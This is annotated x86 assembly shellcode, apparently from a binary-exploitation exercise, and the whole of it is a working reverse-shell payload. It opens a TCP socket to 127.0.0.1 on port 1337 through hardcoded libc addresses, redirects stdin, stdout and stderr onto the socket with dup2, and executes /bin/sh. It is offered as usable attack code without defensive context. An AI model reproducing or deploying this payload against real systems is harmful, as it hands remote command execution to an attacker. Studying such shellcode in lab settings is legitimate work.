sub		esp, 900
jmp	_GET_STRINGS
_SHELLCODE:
mov		ebp, esp
sub		esp, 0x1c
mov 	dword ptr [ebp-0x1c], 0
mov		dword ptr [ebp-0x18], 1
mov		dword ptr [ebp-0x14], 0	#socket file descriptor
mov		dword ptr [ebp-0x10], 0	#struct sockaddr_in
mov		dword ptr [ebp-0x0c], 0	#struct sockaddr_in
mov		dword ptr [ebp-0x08], 0	#struct sockaddr_in
mov		dword ptr [ebp-0x04], 0	#struct sockaddr_in
push 	0
mov 	eax, [ebp]
push 	[eax+0x04]				#pushing \sh\0
push	[eax]					#pushing \bin
mov		[ebp-0x1c], esp 		#pointer to argv



push	0				#protocol
push	1				#type
push	2				#family
mov		eax, 0x08048730	#socket
call	eax				#sockfd = socket(AF_INET, SOCK_STREAM, 0)
mov		esi, eax

push	4				#optlen
lea		eax, [ebp-0x18]
push	eax				#optval
push	2				#optname
push	1				#level
push	esi				#socket file descriptor
mov		eax, 0x080485F0	#setsockopt address
call	eax				#setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))

mov		word ptr [ebp-0x10], 2	#server_addr.sa_family = 2
mov		eax, 0x539				#port number 1337
movzx	eax, ax
push	eax						#port
mov		eax, 0x08048640			#htons address
call	eax						#htons(port)
mov		word ptr [ebp-0x0e], ax	#server_addr.sa_data = 1337

mov		eax, [ebp] 	#hostname
add		eax, 0x08
push	eax
mov		eax, 0x08048740	#inet_addr address
call	eax	#inet_addr(hostname)
mov		[ebp-0x0c], eax


push	0x10
lea		eax, [ebp-0x10]
push	eax	#struct sockaddr server_addr
push	esi	#socket file descriptor
mov		eax, 0x08048750	#connect address
call	eax	#connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr))


push	0  	#insert fildes2
push	esi	#insert fildes (socket fd)
mov		eax, 0x08048600 	#dup2(socketfd, 0)
call	eax


push	1 	#insert fildes2
push	esi	#insert fildes (socket fd)
mov		eax, 0x08048600	#dup2(socketfd, 1)
call	eax

push	2 	#insert fildes2
push	esi 	#insert fildes (socket fd)
mov		eax, 0x08048600 	#dup2(socketfd, 2)
call	eax

mov 	eax, ebp
sub 	eax, 0x1c
push 	eax 		#pushing poitner to pointer (char *argv[])
mov 	eax, [eax]	#eax = [ebp]-0x1c
push 	eax			#pushing pointer to path "\bin\sh"	
mov		eax, 0x080486d0 	#execv("\bin\sh", ["\bin\sh",0])
call	eax

_GET_STRINGS:
call _SHELLCODE
.STRING	"/bin/sh"
.STRING	"127.0.0.1"